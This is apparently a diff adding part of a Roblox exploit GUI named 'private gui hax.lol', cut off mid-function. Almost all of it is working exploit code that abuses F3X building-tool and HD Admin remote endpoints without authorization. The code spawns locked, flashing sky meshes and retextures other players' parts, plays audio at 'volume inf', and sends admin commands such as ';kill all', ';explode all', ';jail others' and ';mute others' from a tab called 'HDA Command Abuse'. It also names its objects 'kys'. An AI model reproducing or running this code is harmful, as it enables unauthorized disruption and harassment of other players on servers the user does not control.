+	script.Parent.MouseButton1Click:Connect(function()
+		local id = script.Parent.Parent.TextBoxDecal.Text
+		local color = script.Parent.Parent.TextBoxColor.Text
+		local x, y, z = color:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local size = script.Parent.Parent.TextBoxSize.Text
+		local c, v, b = size:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local trans = script.Parent.Parent.TextBoxT.Text
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+	
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({ "SyncAnchor", { { Part = sky, Anchored = true } } })
+		ohno({ "SyncCollision", { { Part = sky, CanCollide = false } } })
+		ohno({ "CreateMeshes", { { Part = sky } } })
+		task.spawn(function()
+			ohno({
+				"SyncMesh",
+				{{
+					Part = sky,
+					MeshId = "rbxassetid://111891702759441",
+					TextureId = "rbxassetid://" .. id,
+					Scale = Vector3.new(tonumber(c), tonumber(v), tonumber(b)),
+					VertexColor = Vector3.new(2, 2, 2)
+				}}
+			})
+		end)
+		ohno({ "SetLocked", { sky }, true })
+		ohno({ "SetName", { sky }, "kys" })
+		ohno({ "SyncMaterial", { { Part = sky, Transparency = trans } } })
+		ohno({ "SyncMove", { { Part = sky, CFrame = cf } } })
+	
+		task.spawn(function()
+			while true do
+				task.wait(0.85)
+				ohno({
+					"SyncMesh",
+					{{
+						Part = sky,
+						VertexColor = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
+					}}
+				})
+				task.wait(0.85)
+				ohno({
+					"SyncMesh",
+					{{
+						Part = sky,
+						VertexColor = Vector3.new(2, 2, 2)
+					}}
+				})
+			end
+		end)
+	end)
+end;
+task.spawn(C_174);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set ForceField SkyBox.LocalScript
+function C_176()
+local script = G2L["176"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local id = script.Parent.Parent.TextBoxDecal.Text
+		-- method forcefield by Krnlkid
+		-- credit to krnlkid
+	
+		local color = script.Parent.Parent.TextBoxColor.Text
+		local x, y, z = color:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local size = script.Parent.Parent.TextBoxSize.Text
+		local c, v, b = size:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+	
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({ "SyncAnchor", { { Part = sky, Anchored = true } } })
+		ohno({ "SyncCollision", { { Part = sky, CanCollide = false } } })
+		ohno({ "CreateMeshes", { { Part = sky } } })
+		ohno({
+			"SyncMesh",
+			{{
+				Part = sky,
+				MeshId = "rbxassetid://111891702759441",
+				TextureId = "rbxassetid://" .. id,
+				Scale = Vector3.new(tonumber(c), tonumber(v), tonumber(b)),
+				VertexColor = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
+			}}
+		})
+		ohno({ "SetLocked", { sky }, true })
+		ohno({ "SetName", { sky }, "kys" })
+		ohno({ "SyncMaterial", { { Part = sky, Material = Enum.Material.ForceField } } })
+		ohno({ "SyncMove", { { Part = sky, CFrame = cf } } })
+	end)
+end;
+task.spawn(C_176);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.ResetButton.LocalScript
+function C_179()
+local script = G2L["179"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local textbox1 = script.Parent.Parent.TextBoxColor
+		local textbox2 = script.Parent.Parent.TextBoxSize
+		local textbox3 = script.Parent.Parent.TextBoxT
+		
+		if textbox1 then
+			textbox1.Text = "3,3,3"
+		end
+		if textbox2 then
+			textbox2.Text = "50000,50000,50000"
+		end
+		if textbox3 then
+			textbox3.Text = "0"
+		end
+	end)
+end;
+task.spawn(C_179);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Texture Skybox.LocalScript
+function C_180()
+local script = G2L["180"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+	
+		local poop
+		for _,v in ipairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then poop = v.Parent break end
+		end
+	
+		if not poop then
+			warn("broo where is btools bro")
+			return
+		end
+	
+		local burymealive = poop.SyncAPI.ServerEndpoint
+	
+		local function olivetreehaha(args)
+			task.defer(function()
+				pcall(function()
+					burymealive:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hdadmin = script.Parent.Parent.TextBoxDecal.Text
+		hdadmin = tostring(hdadmin):gsub("%s","")
+	
+		local mesh = {
+			["482906818"] = true,
+			["111891702759441"] = true
+		}
+	
+		local function f3x(part, texid)
+			olivetreehaha({
+				"SyncMesh",
+				{{
+					Part = part,
+					TextureId = "rbxassetid://" .. texid
+				}}
+			})
+		end
+	
+		task.defer(function()
+			for _,v in ipairs(workspace:GetDescendants()) do
+				if v:IsA("BasePart") then
+					local onion = ""
+	
+					pcall(function()
+						if v:IsA("MeshPart") then
+							onion = tostring(v.MeshId):gsub("rbxassetid://","")
+						end
+					end)
+	
+					local lifegoeson = v:FindFirstChildOfClass("SpecialMesh")
+					if lifegoeson then
+						pcall(function()
+							onion = tostring(lifegoeson.MeshId):gsub("rbxassetid://","")
+						end)
+					end
+	
+					if mesh[onion] then
+						f3x(v, hdadmin)
+					end
+				end
+			end
+		end)
+	end)
+end;
+task.spawn(C_180);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Texture Spam (Decal).LocalScript
+function C_182()
+local script = G2L["182"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local id = script.Parent.Parent.TextBoxDecal.Text
+		local color = script.Parent.Parent.TextBoxColor.Text
+		local x, y, z = color:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local size = script.Parent.Parent.TextBoxSize.Text
+		local c, v, b = size:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local trans = script.Parent.Parent.TextBoxT.Text
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({"Remove", { hack }})
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({"SyncAnchor", { { Part = sky, Anchored = true } }})
+		ohno({"SyncCollision", { { Part = sky, CanCollide = false } }})
+		ohno({"CreateMeshes", { { Part = sky } }})
+		ohno({"SyncMesh", { {
+			Part = sky,
+			MeshId = "rbxassetid://126088055641951",
+			TextureId = "rbxassetid://" .. id,
+			Scale = Vector3.new(tonumber(c), tonumber(v), tonumber(b)),
+			VertexColor = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
+		} }})
+		ohno({"SetLocked", { sky }, true})
+		ohno({"SetName", { sky }, "kys"})
+		ohno({"SyncMaterial", { { Part = sky, Transparency = tonumber(trans) } }})
+		ohno({"SyncMove", { { Part = sky, CFrame = cf } }})
+	end)
+end;
+task.spawn(C_182);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_185()
+local script = G2L["185"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 83163403313802 ;pitch 3.7 ;volume inf")
+	end)
+end;
+task.spawn(C_185);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_188()
+local script = G2L["188"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sound 79766207703529 ;volume inf ;pitch 0.3")
+	end)
+end;
+task.spawn(C_188);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_18a()
+local script = G2L["18a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 132870964320141 ;pitch 0.135 ;volume inf")
+	end)
+end;
+task.spawn(C_18a);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_18c()
+local script = G2L["18c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sound 80053116409343 ;volume inf")
+	end)
+end;
+task.spawn(C_18c);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_18e()
+local script = G2L["18e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sound 115440201770223 ;volume inf")
+	end)
+end;
+task.spawn(C_18e);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_190()
+local script = G2L["190"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 136937644769481 ;pitch 0.3 ;volume inf")
+	end)
+end;
+task.spawn(C_190);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_192()
+local script = G2L["192"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 110768151443628 ;pitch 0.07 ;volume inf")
+	end)
+end;
+task.spawn(C_192);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_194()
+local script = G2L["194"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 99974358068663 ;pitch 0.15 ;volume inf")
+	end)
+end;
+task.spawn(C_194);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_196()
+local script = G2L["196"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 139488665764275 ;pitch 0.9 ;volume inf")
+	end)
+end;
+task.spawn(C_196);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_198()
+local script = G2L["198"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 86393146538796 ;pitch 0.125 ;volume inf")
+	end)
+end;
+task.spawn(C_198);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_19a()
+local script = G2L["19a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 97867270106684 ;pitch 0.25 ;volume inf")
+	end)
+end;
+task.spawn(C_19a);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_19c()
+local script = G2L["19c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 80515722989681 ;pitch 0.2 ;volume inf")
+	end)
+end;
+task.spawn(C_19c);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_19e()
+local script = G2L["19e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 1846368080 ;volume inf")
+	end)
+end;
+task.spawn(C_19e);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1a0()
+local script = G2L["1a0"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 132046898251409 ;pitch 0.36 ;volume inf")
+	end)
+end;
+task.spawn(C_1a0);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1a2()
+local script = G2L["1a2"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 100384216498934 ;pitch 0.1 ;volume inf")
+	end)
+end;
+task.spawn(C_1a2);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1a4()
+local script = G2L["1a4"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 79999206651848 ;pitch 0.22 ;volume inf")
+	end)
+end;
+task.spawn(C_1a4);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1a6()
+local script = G2L["1a6"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 127653283576622 ;pitch 1.15 ;volume inf")
+	end)
+end;
+task.spawn(C_1a6);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1a8()
+local script = G2L["1a8"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 1847661821 ;volume inf")
+	end)
+end;
+task.spawn(C_1a8);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1aa()
+local script = G2L["1aa"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 105819456196233 ;pitch 0.29 ;volume inf")
+	end)
+end;
+task.spawn(C_1aa);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1ac()
+local script = G2L["1ac"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 1839246711 ;volume inf")
+	end)
+end;
+task.spawn(C_1ac);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1ae()
+local script = G2L["1ae"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 87744462419495 ;pitch 0.13 ;volume inf")
+	end)
+end;
+task.spawn(C_1ae);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1b0()
+local script = G2L["1b0"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 140240856766854 ;pitch 0.2 ;volume inf")
+	end)
+end;
+task.spawn(C_1b0);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1b2()
+local script = G2L["1b2"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";music 6070263388 ;volume inf")
+	end)
+end;
+task.spawn(C_1b2);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1b4()
+local script = G2L["1b4"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";music 104181508980428 ;pitch 0.22 ;volume inf")
+	end)
+	
+end;
+task.spawn(C_1b4);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1b6()
+local script = G2L["1b6"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";music 7153945201 ;volume inf")
+	end)
+end;
+task.spawn(C_1b6);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1b8()
+local script = G2L["1b8"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";music 123507068071275 ;volume inf")
+	end)
+end;
+task.spawn(C_1b8);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1ba()
+local script = G2L["1ba"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 113548699544058")
+		RequestCommand:InvokeServer(";pitch 0.1")
+		RequestCommand:InvokeServer(";volume inf")
+	end)
+end;
+task.spawn(C_1ba);
+-- StarterGui.private gui hax.lol.Audio tab Page.Set Pitch.LocalScript
+function C_1bc()
+local script = G2L["1bc"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";pitch "..script.Parent.Parent.TextBoxPitch.Text)
+	end)
+end;
+task.spawn(C_1bc);
+-- StarterGui.private gui hax.lol.Audio tab Page.Play Audio.LocalScript
+function C_1be()
+local script = G2L["1be"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";music "..script.Parent.Parent.TextBoxAudio.Text)
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";volume inf")
+	end)
+end;
+task.spawn(C_1be);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1c1()
+local script = G2L["1c1"];
+	script.Parent.mouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";music 87663330165612")
+		RequestCommand:InvokeServer(";pitch 0.1")
+		RequestCommand:InvokeServer(";volume inf")
+	end)
+end;
+task.spawn(C_1c1);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1c3()
+local script = G2L["1c3"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";sound 120678432260694")
+		RequestCommand:InvokeServer(";pitch 4")
+		RequestCommand:InvokeServer(";volume inf")
+	end)
+end;
+task.spawn(C_1c3);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1c5()
+local script = G2L["1c5"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sound 75189946724472 ;volume inf")
+	end)
+end;
+task.spawn(C_1c5);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1c7()
+local script = G2L["1c7"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommandSilent:InvokeServer(";sound 127916720193602 ;volume inf ;pitch 2.75")
+	end)
+end;
+task.spawn(C_1c7);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1c9()
+local script = G2L["1c9"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sound 119281694276389 ;pitch 0.07 ;volume inf")
+	end)
+end;
+task.spawn(C_1c9);
+-- StarterGui.private gui hax.lol.Audio tab Page.Button.LocalScript
+function C_1cb()
+local script = G2L["1cb"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";sound 104397468404849 ;volume inf")  
+	end)
+end;
+task.spawn(C_1cb);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1cf()
+local script = G2L["1cf"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";fire all")
+	end)
+end;
+task.spawn(C_1cf);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1d1()
+local script = G2L["1d1"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";kill all")
+	end)
+end;
+task.spawn(C_1d1);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1d3()
+local script = G2L["1d3"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";freeze others")
+	end)
+end;
+task.spawn(C_1d3);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1d5()
+local script = G2L["1d5"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";jail others")
+	end)
+end;
+task.spawn(C_1d5);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1d7()
+local script = G2L["1d7"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";explode all")
+	end)
+end;
+task.spawn(C_1d7);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1d9()
+local script = G2L["1d9"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";speed me 50")
+	end)
+end;
+task.spawn(C_1d9);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1db()
+local script = G2L["1db"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";char all cZerkidd")
+	end)
+end;
+task.spawn(C_1db);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1dd()
+local script = G2L["1dd"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";char all Elv4r0x")
+	end)
+end;
+task.spawn(C_1dd);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1df()
+local script = G2L["1df"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";")
+	end)
+end;
+task.spawn(C_1df);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1e1()
+local script = G2L["1e1"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";r6 all")
+	end)
+end;
+task.spawn(C_1e1);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1e3()
+local script = G2L["1e3"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";mute others")
+	end)
+end;
+task.spawn(C_1e3);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1e5()
+local script = G2L["1e5"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";unmute others")
+	end)
+end;
+task.spawn(C_1e5);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+function C_1e7()
+local script = G2L["1e7"];
